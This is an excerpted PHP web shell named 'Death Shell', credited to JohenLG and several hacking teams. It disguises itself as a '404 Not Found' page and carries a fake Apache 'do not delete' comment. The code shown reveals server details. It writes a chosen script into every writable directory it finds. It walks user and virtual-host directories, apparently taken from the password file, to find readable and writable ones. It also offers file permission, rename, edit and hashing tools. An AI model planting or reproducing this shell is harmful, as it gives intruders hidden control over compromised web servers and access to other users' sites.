<?php
/*DO NOT DELETE THIS FILE, © APACHE*/
...
<head>
	<title>404 Not Found</title>
<meta charset="UTF-8"> <meta name="Author" content="JohenLG" /> <meta name="copyright" content="|I<3U|" /<meta name="description" content="Death Networks" />
</head>
<style>
...
<title>WELCOME TO Death Shell</title>
...
.destroy_table {;
  ...
  text-shadow:0px 0px 0px #ff0000;
       ...
       .td_table {;
  background-color: #000000;
            background-image: url(https://k.top4top.io/p_3324oysu11.png);
...
<center>
<br>
<font face="Kelly Slab" color="white" size="7px">WELCOME TO <span style="color:green;">Death Shell</span></font><br>
<marquee><b><fonte face="courier new" color="white" size="4">Death Networks - LulzSecTeam - Vhack Revolutions</font></b></marquee>
<center><audio controls="controls" src="lagu3.mp3" type="audio/mpeg"></audio></center>
<table width="100%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>';
echo "<tr><td><font color='white'>
+ IP Kamu    <td>: <font color='green'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
+ IP Server  <td>: <font color='green'>".gethostbyname($_SERVER['HTTP_HOST'])."<tr><td><font color='white'>
+ system     <td>: <font color='green'>".php_uname()."<tr><td><font color='white'>
+ Coded By   <td>: <font color='green'JohenLG<tr><td><font color='white'>
+ Website<td>: <font color='green'>Soon<tr><td><font color='white'>
+ Telegram <td>: <font color='green'>@johenlastgen</font></tr></td><br>
</table>";
		...
		if(is_writable($dir)) {
			...
			foreach($dira as $dirb) {
				...
				if($dirb === '.') {
					...
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=green>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
				...
				while($gets = fgets($f)) {
					...
					if(is_dir($dir_user) === true) {
						...
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=green>R</font>] <a href='?dir=$url_user'><font color=green>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font green=green>RW</font>] <a href='?dir=$url_user'><font color=green>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
			...
			foreach($urls as $url) {
				...
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=green>R</font>] <a href='?dir=$web_vh'><font color=green>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=green>RW</font>] <a href='?dir=$web_vh'><font color=green>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			...
			if($passwd == '' || !$etc) {
				...
				foreach($user_jumping[1] as $user_idx_jump) {
					...
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=greenBlue>R</font>] <a href='?dir=$user_jumping_dir'><font color=green>$user_jumping_dir</font></a>";
...
echo "</div>";
 ...
 echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
   ...
   <td>
   <center>
   <h2 style='color'#00ff00'>About Me</font></h2>
   <p style='color: white;'>Team: Death Networks - <font color="red">ATK Team - LulzSecTeam - Vhack Revolutions</p>
   </center>
   </td>
   </tr>
   <?php
...
echo '<font color="green">CANGE PERM SUCCES !!!!!</font><br/>';
echo "[ <a href='?path=$path'>Kembali</a> ]";
}else{
...
echo '<font color="green">RENAME SUCCES !!!!!</font><br/>';
echo "[ <a href='?path=$path'>Kembali</a> ]";
}else{
...
echo '<font color="green">EDIT SUCCES<br/>';
echo "[ <a href='?path=$path'>Kembali</a> ]";
}else{
...
<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px #00ff00;border-radius:5px">
...
<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #ffffff;border-radius:5px">
</form></center></td>
</tr>';
}
...
<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px #00ff00;border-radius:5px">
</form></center></td>
</tr>';
}
echo '</table>
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">" JohenLG</center>
</body>
</html>';
function perms($file){
